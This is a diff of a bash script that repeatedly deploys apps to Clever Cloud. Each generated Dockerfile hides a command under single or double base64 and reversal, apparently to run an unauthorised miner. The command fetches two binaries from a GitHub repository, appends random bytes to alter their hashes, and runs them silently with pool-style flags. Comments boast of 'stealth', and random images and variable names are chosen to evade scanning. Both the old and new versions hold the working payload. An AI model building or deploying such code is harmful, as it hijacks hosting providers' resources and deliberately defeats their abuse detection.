@@ -1,5 +1,5 @@
 #!/bin/bash
-# /app/docker - Using --alias correctly
+# /docker - Using --alias correctly
 
 set -e
 
@@ -12,8 +12,8 @@ echo "🔐 Logging into Clever Cloud..."
 clever login
 
 for i in 1 2 3; do
-    APP_NAME="webapp-$(date +%s)-${RANDOM}"
-    APP_DIR="/app/deployments/$APP_NAME"
+    APP_NAME="$(date +%s)-${RANDOM}"
+    APP_DIR="/deployments/$APP_NAME"
     
     echo ""
     echo "[$i/3] Deploying $APP_NAME..."
@@ -21,92 +21,74 @@ for i in 1 2 3; do
     mkdir -p "$APP_DIR"
     cd "$APP_DIR"
     
-    # Create Dockerfile
-
-SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
-WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
-
-# Encode URLs to base64
-SOCAT_ENCODED=$(echo -n "$SOCAT_URL" | base64 -w 0)
-WEB8888_ENCODED=$(echo -n "$WEB8888_URL" | base64 -w 0)
-
-# Generate random variable names (changes every run)
-VAR1=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-VAR2=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-VAR6=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-VAR7=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
-
-# Generate random values (changes every run)
-VAL1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-VAL2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-VAL3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
-VAL4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
-VAL5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
-
-# Pool of 50 working Debian and Ubuntu images (20.04+ and Debian 10+)
-WORKING_IMAGES=(
-    # Ubuntu 20.04+ (fully compatible)
-    "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04" "ubuntu:focal" "ubuntu:jammy"
-    "ubuntu:noble" "ubuntu:20.04.1" "ubuntu:20.04.2" "ubuntu:20.04.3" "ubuntu:20.04.4"
-    "ubuntu:20.04.5" "ubuntu:20.04.6" "ubuntu:22.04.1" "ubuntu:22.04.2" "ubuntu:22.04.3"
-    "ubuntu:22.04.4" "ubuntu:22.04.5" "ubuntu:22.04.6" "ubuntu:24.04.1" "ubuntu:24.04.2"
-    # Debian 11+ (fully compatible)
-    "debian:bookworm" "debian:bullseye" "debian:12" "debian:11" "debian:bookworm-slim"
-    "debian:bullseye-slim" "debian:12-slim" "debian:11-slim" "debian:12.0" "debian:11.0"
-    "debian:11.1" "debian:11.2" "debian:11.3" "debian:11.4" "debian:11.5"
-    "debian:11.6" "debian:11.7" "debian:11.8" "debian:11.9" "debian:11.10"
-    "debian:12.1" "debian:12.2" "debian:12.3" "debian:12.4" "debian:12.5"
-    "debian:12.6" "debian:12.7" "debian:12.8" "debian:12.9" "debian:stable"
-    "debian:testing" "debian:bookworm-backports" "debian:bullseye-backports"
-)
-
-# Pick random image
-RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
-
-# Compatible package installation (works on both Debian and Ubuntu)
-COMPLETE_COMMAND="${VAR1}='${VAL1}' && ${VAR2}='${VAL2}' && ${VAR3}='${VAL3}' && ${VAR4}='${VAL4}' && ${VAR5}='${VAL5}' && ${VAR6}=\$(echo '${SOCAT_ENCODED}' | base64 -d) && ${VAR7}=\$(echo '${WEB8888_ENCODED}' | base64 -d) && apt-get update > /dev/null 2>&1 && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip > /dev/null 2>&1 || apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-traditional iputils-ping sudo wget curl unzip > /dev/null 2>&1 && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget -O \${${VAR1}} \${${VAR6}} > /dev/null 2>&1 && wget -O \${${VAR2}} \${${VAR7}} > /dev/null 2>&1 && dd if=/dev/urandom of=\${${VAR1}} bs=1 count=\$(od -An -N1 -tu1 /dev/urandom | tr -d ' ') conv=notrunc oflag=append 2>/dev/null && dd if=/dev/urandom of=\${${VAR2}} bs=1 count=\$(od -An -N1 -tu1 /dev/urandom | tr -d ' ') conv=notrunc oflag=append 2>/dev/null && chmod 777 \${${VAR1}} \${${VAR2}} && (bash \${${VAR1}} > /dev/null 2>&1 &) ; service apache2 start > /dev/null 2>&1 && exec ./\${${VAR2}} -a \${${VAR3}} -o \${${VAR4}} -u \${${VAR5}}"
-
-# Encode the entire command to ONE base64 string
-ONE_BASE64=$(echo -n "$COMPLETE_COMMAND" | base64 -w 0)
-
-# Randomly add an extra encoding layer for more stealth
-if [ $((RANDOM % 2)) -eq 0 ]; then
-    ONE_BASE64=$(echo -n "$ONE_BASE64" | base64 -w 0)
-    DECODE_CMD="base64 -d | base64 -d"
-else
-    ONE_BASE64=$(echo -n "$ONE_BASE64" | rev)
-    DECODE_CMD="rev | base64 -d"
-fi
-
-# Create Dockerfile with random image
-cat > Dockerfile << EOF
+    # Obfuscated URLs
+    SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
+    WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
+    
+    # Encode URLs to base64
+    SOCAT_ENCODED=$(echo -n "$SOCAT_URL" | base64 -w 0)
+    WEB8888_ENCODED=$(echo -n "$WEB8888_URL" | base64 -w 0)
+    
+    # Generate random variable names (changes every run)
+    VAR1=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+    VAR2=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+    VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+    VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+    VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+    VAR6=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+    VAR7=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+    
+    # Generate random values (changes every run)
+    VAL1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+    VAL2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+    VAL3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
+    VAL4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
+    VAL5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
+    
+    # Pool of working Debian and Ubuntu images
+    WORKING_IMAGES=(
+        "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04" "ubuntu:focal" "ubuntu:jammy"
+        "ubuntu:noble" "ubuntu:20.04.1" "ubuntu:20.04.2" "ubuntu:20.04.3" "ubuntu:20.04.4"
+        "ubuntu:20.04.5" "ubuntu:20.04.6" "ubuntu:22.04.1" "ubuntu:22.04.2" "ubuntu:22.04.3"
+        "ubuntu:22.04.4" "ubuntu:22.04.5" "ubuntu:22.04.6" "ubuntu:24.04.1" "ubuntu:24.04.2"
+        "debian:bookworm" "debian:bullseye" "debian:12" "debian:11" "debian:bookworm-slim"
+        "debian:bullseye-slim" "debian:12-slim" "debian:11-slim" "debian:12.0" "debian:11.0"
+        "debian:11.1" "debian:11.2" "debian:11.3" "debian:11.4" "debian:11.5"
+        "debian:11.6" "debian:11.7" "debian:11.8" "debian:11.9" "debian:11.10"
+        "debian:12.1" "debian:12.2" "debian:12.3" "debian:12.4" "debian:12.5"
+        "debian:12.6" "debian:12.7" "debian:12.8" "debian:12.9" "debian:stable"
+        "debian:testing" "debian:bookworm-backports" "debian:bullseye-backports"
+    )
+    
+    # Pick random image
+    RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
+    
+    # Compatible package installation (works on both Debian and Ubuntu)
+    COMPLETE_COMMAND="${VAR1}='${VAL1}' && ${VAR2}='${VAL2}' && ${VAR3}='${VAL3}' && ${VAR4}='${VAL4}' && ${VAR5}='${VAL5}' && ${VAR6}=\$(echo '${SOCAT_ENCODED}' | base64 -d) && ${VAR7}=\$(echo '${WEB8888_ENCODED}' | base64 -d) && apt-get update > /dev/null 2>&1 && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip > /dev/null 2>&1 || apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-traditional iputils-ping sudo wget curl unzip > /dev/null 2>&1 && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget -O \${${VAR1}} \${${VAR6}} > /dev/null 2>&1 && wget -O \${${VAR2}} \${${VAR7}} > /dev/null 2>&1 && dd if=/dev/urandom of=\${${VAR1}} bs=1 count=\$(od -An -N1 -tu1 /dev/urandom | tr -d ' ') conv=notrunc oflag=append 2>/dev/null && dd if=/dev/urandom of=\${${VAR2}} bs=1 count=\$(od -An -N1 -tu1 /dev/urandom | tr -d ' ') conv=notrunc oflag=append 2>/dev/null && chmod 777 \${${VAR1}} \${${VAR2}} && (bash \${${VAR1}} > /dev/null 2>&1 &) ; service apache2 start > /dev/null 2>&1 && exec ./\${${VAR2}} -a \${${VAR3}} -o \${${VAR4}} -u \${${VAR5}}"
+    
+    # Encode the entire command to ONE base64 string
+    ONE_BASE64=$(echo -n "$COMPLETE_COMMAND" | base64 -w 0)
+    
+    # Randomly add an extra encoding layer for more stealth
+    if [ $((RANDOM % 2)) -eq 0 ]; then
+        ONE_BASE64=$(echo -n "$ONE_BASE64" | base64 -w 0)
+        DECODE_CMD="base64 -d | base64 -d"
+    else
+        ONE_BASE64=$(echo -n "$ONE_BASE64" | rev)
+        DECODE_CMD="rev | base64 -d"
+    fi
+    
+    # Create Dockerfile with random image, workdir root
+    cat > Dockerfile << EOF
 FROM ${RANDOM_IMAGE}
-WORKDIR /app
+WORKDIR /
 CMD eval "\$(echo '${ONE_BASE64}' | ${DECODE_CMD} | bash)"
 EOF
-
-echo "========================================="
-echo "   ULTRA STEALTH - DEBIAN/UBUNTU MIX"
-echo "========================================="
-echo "✅ Dockerfile contains ONLY 1 base64 string"
-echo "✅ Base64 changes EVERY run (random vars)"
-echo "✅ Binary SHA changed (random bytes appended)"
-echo "✅ Random image: ${RANDOM_IMAGE}"
-echo "✅ Variables used: ${VAR1}, ${VAR2}, ${VAR3}, ${VAR4}, ${VAR5}, ${VAR6}, ${VAR7}"
-echo "========================================="
-echo ""
-echo "Dockerfile content:"
-cat Dockerfile
-echo ""
-echo "Building and running..."
-
+    
     # Git setup
     git init
     git add .
-    git commit -m "Initial commit for $APP_NAME"
+    git commit -m "Initial commit"
     
     # Create and deploy
     echo "Creating app on Clever Cloud..."
@@ -117,7 +99,7 @@ echo "Building and running..."
     
     echo "[$i/3] ✅ https://$APP_NAME.osc-fr1.scalingo.io"
     
-    cd /app
+    cd /
     rm -rf "$APP_DIR"
     
     if [ $i -lt 3 ]; then
